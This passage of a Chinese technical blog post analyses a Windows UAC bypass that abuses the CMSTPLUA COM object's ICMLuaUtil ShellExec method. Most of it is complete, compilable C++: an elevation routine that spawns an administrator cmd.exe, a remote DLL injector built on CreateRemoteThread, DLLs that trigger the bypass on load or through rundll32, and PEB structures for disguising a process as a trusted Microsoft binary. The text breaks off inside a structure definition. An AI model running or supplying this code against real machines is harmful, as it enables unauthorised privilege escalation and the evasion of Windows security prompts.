---
layout:       post
title:        "BypssUAC_com组件CMSTPLUA_ICMLuaUtil接口提权"
subtitle:     "UACME_41技术分析，利用进程伪装+CMSTPLUA组件任意ICMLuaUtil命令执行接口绕过UAC"
author:      "Ga0weI"
header-style: text
catalog:      true
tags:
    - BypassUAC
    - windows
    - 进程属性伪造
    - 代码
---



# 0x01 前言

UACME这个项目基本时收录了目前所有公开的bypassuac手段，这些绕过手段大致可以分为几大类，其中较为常见的一类是：

**通过利用某些com组件的某些接口存在的方法可以任意命令执行，并通过白名单进程（explorer.exe 、dllhost.exe等）或者做了属性伪装的进程调用对应的接口，从而实现提权；**



# 0x02 原理

com组件本质上是二进制文件(dll、exe,在windows系统内),其调用方法与c++的类相似，程序可以通过被称为CLSID(全局标识符)作为索引在注册表内找到具体的二进制文件；

借助com组件bypassuac提权需要：
1、伪装微软合法程序调用com组件；
2、这个com组件存在相关接口和方法可以任意命令执行；

windows本身提供了一种com组件提权的方法，当这种提提权方法的调用者是拥有微软签名的合法程序时(其本质是校验PEB里面ldr+cmdline)，会忽略uac弹窗；

在一个叫`CMSTPLUA`的com组件组件中，有一个名为ICMLuaUtil的接口，这个接口提供了一个名为ShellExec的方法，可以任意命令执行，如果我们可以使用高权限ICMLuaUtil组件接口调用ShellExec运行特定的程序，那么我们就能获得管理员权限。



# 0x03 落地实现及测试

## BypassUAC.h
```c++
#pragma once
#ifndef _BYPASS_UAC_H_
#define _BYPASS_UAC_H_


#include <Windows.h>
#include <objbase.h>
#include <strsafe.h>


#define CLSID_CMSTPLUA                     L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
#define IID_ICMLuaUtil                     L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}"


typedef interface ICMLuaUtil ICMLuaUtil;

typedef struct ICMLuaUtilVtbl {

	BEGIN_INTERFACE

		HRESULT(STDMETHODCALLTYPE* QueryInterface)(
			__RPC__in ICMLuaUtil* This,
			__RPC__in REFIID riid,
			_COM_Outptr_  void** ppvObject);

	ULONG(STDMETHODCALLTYPE* AddRef)(
		__RPC__in ICMLuaUtil* This);

	ULONG(STDMETHODCALLTYPE* Release)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method1)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method2)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method3)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method4)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method5)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method6)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* ShellExec)(
		__RPC__in ICMLuaUtil* This,
		_In_     LPCWSTR lpFile,
		_In_opt_  LPCTSTR lpParameters,
		_In_opt_  LPCTSTR lpDirectory,
		_In_      ULONG fMask,
		_In_      ULONG nShow
		);

	HRESULT(STDMETHODCALLTYPE* SetRegistryStringValue)(
		__RPC__in ICMLuaUtil* This,
		_In_      HKEY hKey,
		_In_opt_  LPCTSTR lpSubKey,
		_In_opt_  LPCTSTR lpValueName,
		_In_      LPCTSTR lpValueString
		);

	HRESULT(STDMETHODCALLTYPE* Method9)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method10)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method11)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method12)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method13)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method14)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method15)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method16)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method17)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method18)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method19)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method20)(
		__RPC__in ICMLuaUtil* This);

	END_INTERFACE

} *PICMLuaUtilVtbl;

interface ICMLuaUtil
{
	CONST_VTBL struct ICMLuaUtilVtbl* lpVtbl;
};


HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid);

BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable);


#endif
```

## main.cpp
```c++
#include "BypassUAC.h"

HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, __out void** ppv)
{

	BIND_OPTS3 bo;
	WCHAR  wszCLSID[50];
	WCHAR  wszMonikerName[300];

	StringFromGUID2(rclsid, wszCLSID, sizeof(wszCLSID) / sizeof(wszCLSID[0]));
	HRESULT hr = StringCchPrintf(wszMonikerName, sizeof(wszMonikerName) / sizeof(wszMonikerName[0]), L"Elevation:Administrator!new:%s", wszCLSID);
	if (FAILED(hr))
		return hr;
	memset(&bo, 0, sizeof(bo));

	bo.cbStruct = sizeof(bo);
	bo.hwnd = hwnd;
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;
	return CoGetObject(wszMonikerName, &bo, riid, ppv);
}

BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable)
{
	HRESULT hr = 0;
	CLSID clsidICMLuaUtil = { 0 };
	IID iidICMLuaUtil = { 0 };
	ICMLuaUtil* CMLuaUtil = NULL;
	BOOL bRet = FALSE;


	CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
	IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);

	CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
	hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW);
	CMLuaUtil->lpVtbl->Release(CMLuaUtil);

	if (GetLastError())

	{
		return FALSE;
	}
	else {
		return TRUE;
	}
}

int main() {

	CoInitialize(NULL);
	CMLuaUtilBypassUAC((LPWSTR)L"c:\\windows\\system32\\cmd.exe");
	CoUninitialize();
	return 0;
}
```

# 0x04 测试：

上面代码是找到com的ICMLuaUtil接口，调用该接口的ShellExec方法，执行指定命令；
编译成exe，直接运行我们会发现其实还是会弹uac，如下图

![image-20240606170233863](/img/BypssUAC_com组件CMSTPLUA_ICMLuaUtil接口提权/image-20240606170233863.png)



这是因为调用com接口的进程不是微软自己的进程，是我们的BypassUAC.exe这个进程，所以这里弹窗了；解决方法

1、利用微软的一些自己进程去调用此com组件对应的接口及方法；远程进程注入、或者利用某些可执行程序特性（比如rundll32是微软自己的pe，我们可以利用其可以执行dll的特定，把调用com组件的逻辑写到dll里面，然后利用rundll32调用）；

2、绕过微软对进程的校验，将我们的进程伪装为微软的进程；

## 远程注入

将编译生成的exe或dll转成shellcode，然后注入到微软定义的合法进程里面，如：explorer.exe等

注入进程：injectdlltoexe.cpp

```c++
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

const char* pkill = "C:\\Windows\\Temp\\injected.dll"; //filepath of dll which waited for inject
//char* prosess = "TestMain.exe"; //target process name 

int main()
{
	HANDLE hSnap;
	HANDLE hkernel32 = NULL; 
	PROCESSENTRY32 pe;
	BOOL bNext;
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	LUID Luid;
	LPVOID p;
	FARPROC pfn;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		printf("OpenProcessToken failed");
		return 1;
	}

	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &Luid))
	{

		printf("LookupPrivilegeValue failed");
		return 1;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tp.Privileges[0].Luid = Luid;

	if (!AdjustTokenPrivileges(hToken, 0, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
	{

		printf("AdjustTokenPrivileges failed");
		return 1;
	}

	pe.dwSize = sizeof(pe);
	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	bNext = Process32First(hSnap, &pe);
	char processname[100];

	printf("Please enter the process name to be injected:");
	scanf("%s", processname);
	printf("process name is：%s\n", processname);

	int flag = 1;
	while (bNext)
	{
		if (!_stricmp(pe.szExeFile, processname))
		{

			hkernel32 = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, 1, pe.th32ProcessID);
			flag = 0;
			break;
		}
		bNext = Process32Next(hSnap, &pe);
	}
	if (flag == 1) {
		printf("do not find process name!\n");
		return 0;
	}
	CloseHandle(hSnap);
	

	p = VirtualAllocEx(hkernel32, NULL, strlen(pkill), MEM_COMMIT, PAGE_READWRITE);
	if (NULL == p)
	{
		printf("VirtualAlloc failed\n");
		return 0;
	}

	
	if (!WriteProcessMemory(hkernel32, p, pkill, strlen(pkill), NULL))
	{
		printf("WriteProcessMemory failed");
		return 0;
	}
	pfn = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
	if (pfn == NULL) {
		printf("GetProcessAddress failed！");
		return 0;
	}
	HANDLE a = CreateRemoteThread(hkernel32, NULL, 0, (LPTHREAD_START_ROUTINE)pfn, p, NULL, 0);
	if (a != NULL)
	{
		printf("inject succeed and get new thread  hanlde  :%d\n", a);
	}
	else {
		printf("inject failed");
		return 0;
	}
	WaitForSingleObject(a, -1);

	VirtualFreeEx(hkernel32, p, 0, MEM_RELEASE);
	CloseHandle(a);
	CloseHandle(hkernel32);
	return 0;
}
```



dll代码：

dllmain：

```c++
#include "framework.h"
#include "bypassuac.h"


#define DLLAPI   extern "C" __declspec(dllexport)
DLLAPI void bypassuacs();

HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, __out void** ppv)
{

	BIND_OPTS3 bo;
	WCHAR  wszCLSID[50];
	WCHAR  wszMonikerName[300];

	StringFromGUID2(rclsid, wszCLSID, sizeof(wszCLSID) / sizeof(wszCLSID[0]));
	HRESULT hr = StringCchPrintf(wszMonikerName, sizeof(wszMonikerName) / sizeof(wszMonikerName[0]), L"Elevation:Administrator!new:%s", wszCLSID);
	if (FAILED(hr))
		return hr;
	memset(&bo, 0, sizeof(bo));

	bo.cbStruct = sizeof(bo);
	bo.hwnd = hwnd;
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;
	return CoGetObject(wszMonikerName, &bo, riid, ppv);
}

BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable)
{
	HRESULT hr = 0;
	CLSID clsidICMLuaUtil = { 0 };
	IID iidICMLuaUtil = { 0 };
	ICMLuaUtil* CMLuaUtil = NULL;
	BOOL bRet = FALSE;


	CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
	IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);

	CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
	hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW);
	CMLuaUtil->lpVtbl->Release(CMLuaUtil);

	if (GetLastError())

	{

		return FALSE;

	}
	else {
		return TRUE;
	}
}


VOID bypassuacs() {
    CoInitialize(NULL);
    CMLuaUtilBypassUAC((LPWSTR)L"c:\\windows\\system32\\cmd.exe");
    CoUninitialize();
}




BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		bypassuacs();
		break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


```

### 效果：

![image-20240726145710782](/img/BypssUAC_com组件CMSTPLUA_ICMLuaUtil接口提权/image-20240726145710782.png)

## rundll32

### 效果：

将代码逻辑编译到dll里面的导出函数里面，使用rundll32调用即可：

![image-20240606170659857](/img/BypssUAC_com组件CMSTPLUA_ICMLuaUtil接口提权/image-20240606170659857.png)

dll代码：

dllmain

```c++
#include "framework.h"
#include "bypassuac.h"

#define DLLAPI   extern "C" __declspec(dllexport)
DLLAPI void bypassuacs();

HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, __out void** ppv)
{

	BIND_OPTS3 bo;
	WCHAR  wszCLSID[50];
	WCHAR  wszMonikerName[300];

	StringFromGUID2(rclsid, wszCLSID, sizeof(wszCLSID) / sizeof(wszCLSID[0]));
	HRESULT hr = StringCchPrintf(wszMonikerName, sizeof(wszMonikerName) / sizeof(wszMonikerName[0]), L"Elevation:Administrator!new:%s", wszCLSID);
	if (FAILED(hr))
		return hr;
	memset(&bo, 0, sizeof(bo));

	bo.cbStruct = sizeof(bo);
	bo.hwnd = hwnd;
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;
	return CoGetObject(wszMonikerName, &bo, riid, ppv);
}

BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable)
{
	HRESULT hr = 0;
	CLSID clsidICMLuaUtil = { 0 };
	IID iidICMLuaUtil = { 0 };
	ICMLuaUtil* CMLuaUtil = NULL;
	BOOL bRet = FALSE;


	CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
	IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);

	CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
	hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW);
	CMLuaUtil->lpVtbl->Release(CMLuaUtil);

	if (GetLastError())

	{

		return FALSE;

	}
	else {
		return TRUE;
	}
}


VOID bypassuacs() {
    CoInitialize(NULL);
    CMLuaUtilBypassUAC((LPWSTR)L"c:\\windows\\system32\\cmd.exe");
    CoUninitialize();
}




BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


```



bypassuac.h  复用上面的；



## 进程伪装

当一个com组件调用发生的时候，微软是如何辨认对应的调用者是否是其受信的调用者的呢，有人分析发现，这个对调用进程判断的逻辑存在几个点：

- PEB下面的_RTL_USER_PROCESS_PARAMETERS 里面的ImagePathName;
- PEB下面的_LDR_DATA_TABLE_ENTRY里面的FullDllName 和 BaseDllName；

效果如下：

![image-20240606172628297](/img/BypssUAC_com组件CMSTPLUA_ICMLuaUtil接口提权/image-20240606172628297.png)



参考代码：

main

```c++
#include "BypassUAC.h"

#include <Shobjidl.h>
#include <string>
#pragma comment(lib, "ntdll.lib")

#define RTL_MAX_DRIVE_LETTERS 32
#define GDI_HANDLE_BUFFER_SIZE32  34
#define GDI_HANDLE_BUFFER_SIZE64  60
#define GDI_BATCH_BUFFER_SIZE 310

#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#if !defined(_M_X64)
#define GDI_HANDLE_BUFFER_SIZE      GDI_HANDLE_BUFFER_SIZE32
#else
#define GDI_HANDLE_BUFFER_SIZE      GDI_HANDLE_BUFFER_SIZE64
#endif

typedef ULONG GDI_HANDLE_BUFFER32[GDI_HANDLE_BUFFER_SIZE32];
typedef ULONG GDI_HANDLE_BUFFER64[GDI_HANDLE_BUFFER_SIZE64];
typedef ULONG GDI_HANDLE_BUFFER[GDI_HANDLE_BUFFER_SIZE];

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;
typedef UNICODE_STRING* PUNICODE_STRING;


typedef struct _STRING {
    USHORT Length;
    USHORT MaximumLength;
    PCHAR Buffer;
} STRING;
typedef STRING* PSTRING;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _CLIENT_ID64 {
    ULONG64 UniqueProcess;
    ULONG64 UniqueThread;
} CLIENT_ID64, * PCLIENT_ID64;

typedef struct _LDR_DATA_TABLE_ENTRY_COMPATIBLE {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    union
    {
        LIST_ENTRY InInitializationOrderLinks;
        LIST_ENTRY InProgressLinks;
    } DUMMYUNION0;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    union
    {
        ULONG Flags;
        struct
        {
            ULONG PackagedBinary : 1; // Size=4 Offset=104 BitOffset=0 BitCount=1
            ULONG MarkedForRemoval : 1; // Size=4 Offset=104 BitOffset=1 BitCount=1
            ULONG ImageDll : 1; // Size=4 Offset=104 BitOffset=2 BitCount=1
            ULONG LoadNotificationsSent : 1; // Size=4 Offset=104 BitOffset=3 BitCount=1
            ULONG TelemetryEntryProcessed : 1; // Size=4 Offset=104 BitOffset=4 BitCount=1
            ULONG ProcessStaticImport : 1; // Size=4 Offset=104 BitOffset=5 BitCount=1
            ULONG InLegacyLists : 1; // Size=4 Offset=104 BitOffset=6 BitCount=1
            ULONG InIndexes : 1; // Size=4 Offset=104 BitOffset=7 BitCount=1
            ULONG ShimDll : 1; // Size=4 Offset=104 BitOffset=8 BitCount=1
            ULONG InExceptionTable : 1; // Size=4 Offset=104 BitOffset=9 BitCount=1
            ULONG ReservedFlags1 : 2; // Size=4 Offset=104 BitOffset=10 BitCount=2
            ULONG LoadInProgress : 1; // Size=4 Offset=104 BitOffset=12 BitCount=1
            ULONG LoadConfigProcessed : 1; // Size=4 Offset=104 BitOffset=13 BitCount=1
            ULONG EntryProcessed : 1; // Size=4 Offset=104 BitOffset=14 BitCount=1
            ULONG ProtectDelayLoad : 1; // Size=4 Offset=104 BitOffset=15 BitCount=1
            ULONG ReservedFlags3 : 2; // Size=4 Offset=104 BitOffset=16 BitCount=2
            ULONG DontCallForThreads : 1; // Size=4 Offset=104 BitOffset=18 BitCount=1
            ULONG ProcessAttachCalled : 1; // Size=4 Offset=104 BitOffset=19 BitCount=1
            ULONG ProcessAttachFailed : 1; // Size=4 Offset=104 BitOffset=20 BitCount=1
            ULONG CorDeferredValidate : 1; // Size=4 Offset=104 BitOffset=21 BitCount=1
            ULONG CorImage : 1; // Size=4 Offset=104 BitOffset=22 BitCount=1
            ULONG DontRelocate : 1; // Size=4 Offset=104 BitOffset=23 BitCount=1
            ULONG CorILOnly : 1; // Size=4 Offset=104 BitOffset=24 BitCount=1
            ULONG ChpeImage : 1; // Size=4 Offset=104 BitOffset=25 BitCount=1
            ULONG ReservedFlags5 : 2; // Size=4 Offset=104 BitOffset=26 BitCount=2
            ULONG Redirected : 1; // Size=4 Offset=104 BitOffset=28 BitCount=1
            ULONG ReservedFlags6 : 2; // Size=4 Offset=104 BitOffset=29 BitCount=2
            ULONG CompatDatabaseProcessed : 1; // Size=4 Offset=104 BitOffset=31 BitCount=1
        };
    } ENTRYFLAGSUNION;
    WORD ObsoleteLoadCount;
    WORD TlsIndex;
    union
    {
        LIST_ENTRY HashLinks;
        struct
        {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    } DUMMYUNION1;
    union
    {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    } DUMMYUNION2;
    //fields below removed for compatibility
} LDR_DATA_TABLE_ENTRY_COMPATIBLE, * PLDR_DATA_TABLE_ENTRY_COMPATIBLE;
typedef LDR_DATA_TABLE_ENTRY_COMPATIBLE LDR_DATA_TABLE_ENTRY;

typedef LDR_DATA_TABLE_ENTRY* PCLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
} PEB_LDR_DATA, * PPEB_LDR_DATA;


typedef struct _CURDIR {
    UNICODE_STRING DosPath;
    HANDLE Handle;
} CURDIR, * PCURDIR;

typedef struct _RTL_DRIVE_LETTER_CURDIR {
    USHORT Flags;
    USHORT Length;
    ULONG TimeStamp;
    STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;


typedef struct _RTL_USER_PROCESS_PARAMETERS {
    ULONG MaximumLength;
    ULONG Length;

    ULONG Flags;
    ULONG DebugFlags;

    HANDLE ConsoleHandle;
    ULONG ConsoleFlags;
    HANDLE StandardInput;
    HANDLE StandardOutput;
    HANDLE StandardError;

    CURDIR CurrentDirectory;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;

    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;

    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

    ULONG EnvironmentSize;
    ULONG EnvironmentVersion;
    PVOID PackageDependencyData; //8+
    ULONG ProcessGroupId;
    // ULONG LoaderThreads;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN IsLongPathAwareProcess : 1;
        };
    };
    HANDLE Mutant;

    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PRTL_CRITICAL_SECTION FastPebLock;
    PVOID AtlThunkSListPtr;
    PVOID IFEOKey;
    union
    {
        ULONG CrossProcessFlags;
        struct
        {
            ULONG ProcessInJob : 1;
            ULONG ProcessInitializing : 1;
            ULONG ProcessUsingVEH : 1;
            ULONG ProcessUsingVCH : 1;
            ULONG ProcessUsingFTH : 1;
            ULONG ProcessPreviouslyThrottled : 1;
            ULONG ProcessCurrentlyThrottled : 1;
            ULONG ReservedBits0 : 25;
        };
        ULONG EnvironmentUpdateCount;
    };
    union
    {
        PVOID KernelCallbackTable;
        PVOID UserSharedInfoPtr;
    };
    ULONG SystemReserved[1];
    ULONG AtlThunkSListPtr32;
    PVOID ApiSetMap;
    ULONG TlsExpansionCounter;
    PVOID TlsBitmap;
    ULONG TlsBitmapBits[2];
    PVOID ReadOnlySharedMemoryBase;
    PVOID HotpatchInformation;
    PVOID* ReadOnlyStaticServerData;
    PVOID AnsiCodePageData;
    PVOID OemCodePageData;
    PVOID UnicodeCaseTableData;

    ULONG NumberOfProcessors;
    ULONG NtGlobalFlag;

    LARGE_INTEGER CriticalSectionTimeout;
    SIZE_T HeapSegmentReserve;
    SIZE_T HeapSegmentCommit;
    SIZE_T HeapDeCommitTotalFreeThreshold;
    SIZE_T HeapDeCommitFreeBlockThreshold;

    ULONG NumberOfHeaps;
    ULONG MaximumNumberOfHeaps;
    PVOID* ProcessHeaps;

    PVOID GdiSharedHandleTable;
    PVOID ProcessStarterHelper;
    ULONG GdiDCAttributeList;

    PRTL_CRITICAL_SECTION LoaderLock;

    ULONG OSMajorVersion;
    ULONG OSMinorVersion;
    USHORT OSBuildNumber;
    USHORT OSCSDVersion;
    ULONG OSPlatformId;
    ULONG ImageSubsystem;
    ULONG ImageSubsystemMajorVersion;
    ULONG ImageSubsystemMinorVersion;
    ULONG_PTR ImageProcessAffinityMask;
    GDI_HANDLE_BUFFER GdiHandleBuffer;
    PVOID PostProcessInitRoutine;

    PVOID TlsExpansionBitmap;
    ULONG TlsExpansionBitmapBits[32];

    ULONG SessionId;

    ULARGE_INTEGER AppCompatFlags;
    ULARGE_INTEGER AppCompatFlagsUser;
    PVOID pShimData;
    PVOID AppCompatInfo;

    UNICODE_STRING CSDVersion;

    PVOID ActivationContextData;
    PVOID ProcessAssemblyStorageMap;
    PVOID SystemDefaultActivationContextData;
    PVOID SystemAssemblyStorageMap;

    SIZE_T MinimumStackCommit;

    PVOID* FlsCallback;
    LIST_ENTRY FlsListHead;
    PVOID FlsBitmap;
    ULONG FlsBitmapBits[FLS_MAXIMUM_AVAILABLE / (sizeof(ULONG) * 8)];
    ULONG FlsHighIndex;

    PVOID WerRegistrationData;
    PVOID WerShipAssertPtr;
    PVOID pContextData;
    PVOID pImageHeaderHash;
    union
    {
        ULONG TracingFlags;
        struct
        {
            ULONG HeapTracingEnabled : 1;
            ULONG CritSecTracingEnabled : 1;
            ULONG LibLoaderTracingEnabled : 1;
            ULONG SpareTracingBits : 29;
        };
    };
    ULONGLONG CsrServerReadOnlySharedMemoryBase;
} PEB, * PPEB;

typedef struct _GDI_TEB_BATCH {
    ULONG	Offset;
    UCHAR	Alignment[4];
    ULONG_PTR HDC;
    ULONG	Buffer[GDI_BATCH_BUFFER_SIZE];
} GDI_TEB_BATCH, * PGDI_TEB_BATCH;

typedef struct _TEB_ACTIVE_FRAME_CONTEXT {
    ULONG Flags;
    PSTR FrameName;
} TEB_ACTIVE_FRAME_CONTEXT, * PTEB_ACTIVE_FRAME_CONTEXT;

typedef struct _TEB_ACTIVE_FRAME {
    ULONG Flags;
    struct _TEB_ACTIVE_FRAME* Previous;
    PTEB_ACTIVE_FRAME_CONTEXT Context;
} TEB_ACTIVE_FRAME, * PTEB_ACTIVE_FRAME;

typedef struct _TEB {
    NT_TIB NtTib;

    PVOID EnvironmentPointer;
    CLIENT_ID ClientId;
    PVOID ActiveRpcHandle;
    PVOID ThreadLocalStoragePointer;
    PPEB ProcessEnvironmentBlock;

    ULONG LastErrorValue;
    ULONG CountOfOwnedCriticalSections;
    PVOID CsrClientThread;
    PVOID Win32ThreadInfo;
    ULONG User32Reserved[26];
    ULONG UserReserved[5];
    PVOID WOW32Reserved;
    LCID CurrentLocale;
    ULONG FpSoftwareStatusRegister;
    PVOID SystemReserved1[54];
    NTSTATUS ExceptionCode;
    PVOID ActivationContextStackPointer;
#if defined(_M_X64)
    UCHAR SpareBytes[24];
#else
    UCHAR SpareBytes[36];
#endif
    ULONG TxFsContext;

    GDI_TEB_BATCH GdiTebBatch;
    CLIENT_ID RealClientId;
    HANDLE GdiCachedProcessHandle;
    ULONG GdiClientPID;
    ULONG GdiClientTID;
    PVOID GdiThreadLocalInfo;
    ULONG_PTR Win32ClientInfo[62];
    PVOID glDispatchTable[233];
    ULONG_PTR glReserved1[29];
    PVOID glReserved2;
    PVOID glSectionInfo;
    PVOID glSection;
    PVOID glTable;
    PVOID glCurrentRC;
    PVOID glContext;

    NTSTATUS LastStatusValue;
    UNICODE_STRING StaticUnicodeString;
    WCHAR StaticUnicodeBuffer[261];

    PVOID DeallocationStack;
    PVOID TlsSlots[64];
    LIST_ENTRY TlsLinks;

    PVOID Vdm;
    PVOID ReservedForNtRpc;
    PVOID DbgSsReserved[2];

    ULONG HardErrorMode;
#if defined(_M_X64)
    PVOID Instrumentation[11];
#else
    PVOID Instrumentation[9];
#endif
    GUID ActivityId;

    PVOID SubProcessTag;
    PVOID EtwLocalData;
    PVOID EtwTraceData;
    PVOID WinSockData;
    ULONG GdiBatchCount;

    union
    {
        PROCESSOR_NUMBER CurrentIdealProcessor;
        ULONG IdealProcessorValue;
        struct
        {
            UCHAR ReservedPad0;
            UCHAR ReservedPad1;
            UCHAR ReservedPad2;
            UCHAR IdealProcessor;
        };
    };

    ULONG GuaranteedStackBytes;
    PVOID ReservedForPerf;
    PVOID ReservedForOle;
    ULONG WaitingOnLoaderLock;
    PVOID SavedPriorityState;
    ULONG_PTR SoftPatchPtr1;
    PVOID ThreadPoolData;
    PVOID* TlsExpansionSlots;
#if defined(_M_X64)
    PVOID DeallocationBStore;
    PVOID BStoreLimit;
#endif
    ULONG MuiGeneration;
    ULONG IsImpersonating;
    PVOID NlsCache;
    PVOID pShimData;
    ULONG HeapVirtualAffinity;
    HANDLE CurrentTransactionHandle;
    PTEB_ACTIVE_FRAME ActiveFrame;
    PVOID FlsData;

    PVOID PreferredLanguages;
    PVOID UserPrefLanguages;
    PVOID MergedPrefLanguages;
    ULONG MuiImpersonation;

    union
    {
        USHORT CrossTebFlags;
        USHORT SpareCrossTebBits : 16;
    };
    union
    {
        USHORT SameTebFlags;
        struct
        {
